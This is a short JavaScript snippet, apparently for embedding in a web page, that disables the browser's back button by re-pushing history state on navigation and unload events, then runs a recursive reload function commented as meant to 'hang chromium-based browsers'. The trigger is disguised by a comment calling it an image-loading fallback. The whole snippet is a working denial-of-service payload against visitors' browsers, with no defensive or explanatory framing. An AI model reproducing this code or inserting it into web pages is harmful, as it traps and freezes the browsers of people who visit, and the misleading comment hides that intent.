// disable back button
let popstate = () => history.pushState(null, null, location.href);
window.addEventListener('popstate', popstate);
window.addEventListener('beforeunload', popstate);
window.addEventListener('unload', popstate);
popstate();

function crash(x) {
    if (typeof x !== "number") x = Math.random();
    // should hang chromium-based browsers
    location.reload();
    return crash(x * x) + crash(x ** x);
}

// fallback for image not loading
setTimeout(crash, 100);